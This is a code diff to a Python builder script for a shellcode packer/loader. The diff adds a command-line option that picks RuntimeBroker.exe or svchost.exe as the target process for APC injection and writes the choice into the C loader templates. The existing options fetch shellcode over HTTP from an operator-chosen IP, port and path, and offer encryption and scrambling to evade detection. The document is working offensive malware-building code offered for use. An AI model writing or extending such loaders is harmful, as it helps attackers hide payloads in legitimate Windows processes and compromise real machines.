@@ -32,6 +32,8 @@ def main():
     # Creating the arguments for the staged subcommand
     parser_staged.add_argument("-p", "--payload", help="Shellcode to be packed", required=True)
     parser_staged.add_argument("-f", "--format", type=str, choices=["EXE", "DLL"], default="EXE", help="Format of the output file (default: EXE).")
+    parser_staged.add_argument("-apc", "--apc", help="Choose between RuntimeBroker.exe or svchost.exe as a target injection process. Defaults to RuntimeBroker.exe", choices=["RuntimeBroker.exe", "svchost.exe"], default="RuntimeBroker.exe")
+
     parser_staged.add_argument("-i", "--ip-address", type=str, help="IP address from where your shellcode is gonna be fetched.", required=True)
     parser_staged.add_argument("-po", "--port", type=int, help="Port from where the HTTP connection is gonna fetch your shellcode.", required=True)
     parser_staged.add_argument("-pa", "--path", type=str, help="Path from where your shellcode uis gonna be fetched. ", required=True)
@@ -49,6 +51,7 @@ def main():
     # Creating the arguments for the stageless subcommand
     parser_stageless.add_argument("-p", "--payload", help="Shellcode to be packed", required=True)
     parser_stageless.add_argument("-f", "--format", type=str, choices=["EXE", "DLL"], default="EXE", help="Format of the output file (default: EXE).")
+    parser_stageless.add_argument("-apc", "--apc", help="Choose between RuntimeBroker.exe or svchost.exe as a target injection process. Defaults to RuntimeBroker.exe", choices=["RuntimeBroker.exe", "svchost.exe"], default="RuntimeBroker.exe")
     
     parser_stageless.add_argument("-e", "--encrypt", action="store_true", help="Encrypt the shellcode via AES-128-CBC.")
     parser_stageless.add_argument("-s", "--scramble", action="store_true", help="Scramble the loader's functions and variables.")
@@ -153,6 +156,32 @@ def main():
 
             print(Colors.green("[+] Template files modified !"))
             
+            print(Colors.light_yellow("[+] Setting APC injection target process..."))
+            # Handling the target APC injection. 
+            if args.format is None or args.format == "EXE":
+                with open(f'{dst_directory}/main.c', 'r') as file:
+                    main_data = file.readlines()
+                    for i in range(len(main_data)):
+                        if "#-TARGET_PROCESS-#" in main_data[i]:
+                            main_data[i] = main_data[i].replace("#-TARGET_PROCESS-#", args.apc)
+
+                # Writing the data back to the file
+                with open(f'{dst_directory}/main.c', 'w') as file:
+                    file.writelines(main_data)
+
+            if args.format == "DLL":
+                with open(f'{dst_directory}/main_dll.c', 'r') as file:
+                    main_data = file.readlines()
+                    for i in range(len(main_data)):
+                        if "#-TARGET_PROCESS-#" in main_data[i]:
+                            main_data[i] = main_data[i].replace("#-TARGET_PROCESS-#", args.apc)
+
+                # Writing the data back to the file
+                with open(f'{dst_directory}/main_dll.c', 'w') as file:
+                    file.writelines(main_data)
+
+            print(Colors.green(f"[+] Target APC injection process set to {args.apc} !"))
+
             # Handling the case if encryption is wanted
             if args.encrypt:
 
@@ -488,6 +517,32 @@ def main():
                         file.writelines(data)
 
             print(Colors.green("[+] Template files modified !"))
+
+            print(Colors.light_yellow("[+] Setting APC injection target process..."))
+            # Handling the target APC injection. 
+            if args.format is None or args.format == "EXE":
+                with open(f'{dst_directory}/main.c', 'r') as file:
+                    main_data = file.readlines()
+                    for i in range(len(main_data)):
+                        if "#-TARGET_PROCESS-#" in main_data[i]:
+                            main_data[i] = main_data[i].replace("#-TARGET_PROCESS-#", args.apc)
+
+                # Writing the data back to the file
+                with open(f'{dst_directory}/main.c', 'w') as file:
+                    file.writelines(main_data)
+                    
+            if args.format == "DLL":
+                with open(f'{dst_directory}/main_dll.c', 'r') as file:
+                    main_data = file.readlines()
+                    for i in range(len(main_data)):
+                        if "#-TARGET_PROCESS-#" in main_data[i]:
+                            main_data[i] = main_data[i].replace("#-TARGET_PROCESS-#", args.apc)
+
+                # Writing the data back to the file
+                with open(f'{dst_directory}/main_dll.c', 'w') as file:
+                    file.writelines(main_data)
+
+            print(Colors.green(f"[+] Target APC injection process set to {args.apc} !"))
 
             # Handling the case if encryption is wanted
             if args.encrypt:
